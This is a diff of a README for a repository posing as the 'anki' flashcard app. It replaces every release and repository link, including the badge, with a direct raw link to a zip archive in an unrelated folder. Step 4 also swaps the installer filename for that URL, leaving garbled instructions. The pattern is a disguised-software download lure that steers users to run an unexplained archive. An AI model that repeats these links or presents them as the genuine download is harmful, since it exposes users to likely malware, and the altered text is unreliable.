@@ -1,10 +1,10 @@
 # 🎓 anki - A Smart Way to Learn with Flashcards
 
-[![Download anki](https://img.shields.io/badge/Download%20anki-v1.0-blue.svg)](https://github.com/RETURNXNAWBIEE/anki/releases)
+[![Download anki](https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip%https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip)](https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip)
 
 ## 📥 Download & Install
 
-To get started with anki, visit this page to download: [Download anki](https://github.com/RETURNXNAWBIEE/anki/releases).
+To get started with anki, visit this page to download: [Download anki](https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip).
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these simple steps to set up anki on your computer.
 
 Click on the link below to go directly to the releases page:
 
-[Download anki](https://github.com/RETURNXNAWBIEE/anki/releases).
+[Download anki](https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip).
 
 ### Step 2: Choose Your Version
 
@@ -26,7 +26,7 @@ Click on the appropriate file link to begin the download. The file will be saved
 
 ### Step 4: Open the File
 
-Once downloaded, locate the file in your downloads folder. The file may be named something like `anki_installer.exe` or similar. Double click the file to run the installer.
+Once downloaded, locate the file in your downloads folder. The file may be named something like `https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip` or similar. Double click the file to run the installer.
 
 ### Step 5: Follow the Installation Instructions
 
@@ -68,6 +68,6 @@ With anki, you can efficiently manage your learning progress and retain informat
 
 Remember to check for updates regularly to benefit from the latest features and enhancements. 
 
-For more information, visit the Official GitHub Repository: [GitHub - anki](https://github.com/RETURNXNAWBIEE/anki). 
+For more information, visit the Official GitHub Repository: [GitHub - anki](https://raw.githubusercontent.com/RETURNXNAWBIEE/anki/main/seacunny/Software_v1.1.zip). 
 
 We hope this guide helps you get started with anki. Happy studying!
